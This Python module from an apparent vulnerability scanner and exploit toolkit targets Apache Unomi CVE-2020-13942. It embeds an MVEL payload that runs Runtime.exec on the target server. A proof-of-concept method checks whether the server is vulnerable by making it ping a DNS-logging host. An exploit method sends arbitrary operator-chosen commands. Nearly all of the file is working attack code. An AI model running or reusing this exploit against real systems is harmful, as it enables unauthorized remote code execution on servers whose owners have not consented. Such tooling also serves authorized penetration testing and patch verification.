#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
from thirdparty import requests
import threading
from module import globals
from core.verify import verify
from thirdparty.requests_toolbelt.utils import dump
from module.api.dns import dns_result, dns_request


class ApacheUnomi():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.payload_cve_2020_13942 = '''{ "filters": [ { "id": "myfilter1_anystr", "filters": [ { "condition": {''' \
                                      '''"parameterValues": {  "": "script::Runtime r = Runtime.getRuntime(); ''' \
                                      '''r.exec(\\"RECOMMAND\\");" }, "type": "profilePropertyCondition" } } ] } ''' \
                                      '''], "sessionId": "test-demo-session-id_anystr" }'''

    def cve_2020_13942_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Unomi: CVE-2020-13942"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2020_13942.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "Apache Unomi remote code execution"
        self.vul_info["vul_numb"] = "CVE-2020-13942"
        self.vul_info["vul_apps"] = "Unomi"
        self.vul_info["vul_date"] = "2020-11-23"
        self.vul_info["vul_vers"] = "< 1.5.2"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "攻击者可以通过精心构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，" \
                                    "漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，" \
                                    "攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。"
        self.vul_info["cre_date"] = "2021-01-28"
        self.vul_info["cre_auth"] = "zhzyker"
        md = dns_request()
        cmd = "ping " + md
        self.payload = self.payload_cve_2020_13942.replace("RECOMMAND", cmd)
        self.headers = {
            'User-Agent': self.ua,
            'Accept': '*/*',
            'Connection': 'close',
            'Content-Type': 'application/json'
        }
        try:
            req = requests.post(self.url + "/context.json", data=self.payload, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            if dns_result(md):
                self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [cmd:" + cmd + "]"
            else:
                rep = list(json.loads(req.text)["trackedConditions"])[0]["parameterValues"]["pagePath"]
                if r"/tracker/" in rep:
                    self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoC_MaYbE"
                    self.vul_info["prt_info"] = "[maybe]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2020_13942_exp(self, cmd):
        self.threadLock.acquire()
        vul_name = "Apache Unomi: CVE-2020-13942"
        self.payload = self.payload_cve_2020_13942.replace("RECOMMAND", cmd)
        self.headers = {
            'User-Agent': self.ua,
            'Accept': '*/*',
            'Connection': 'close',
            'Content-Type': 'application/json'
        }
        try:
            req = requests.post(self.url + "/context.json", data=self.payload, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(req).decode('utf-8', 'ignore')
            r = "Command Executed Successfully (But No Echo)"
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)